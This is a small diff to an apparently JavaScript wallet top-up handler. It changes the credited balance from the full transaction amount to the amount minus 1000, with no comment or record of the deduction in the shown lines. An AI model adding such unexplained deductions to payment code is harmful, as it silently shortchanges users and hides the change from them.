@@ -288,7 +288,7 @@ export const handleTopup = async (req, res) => {
         return;
       }
       const walletData = wallet.data();
-      const balance = walletData.balance + transaction.data().amount;
+      const balance = walletData.balance + (transaction.data().amount-1000);
       await transaction.ref.update({
         status: "settlement",
         method: data.payment_type,
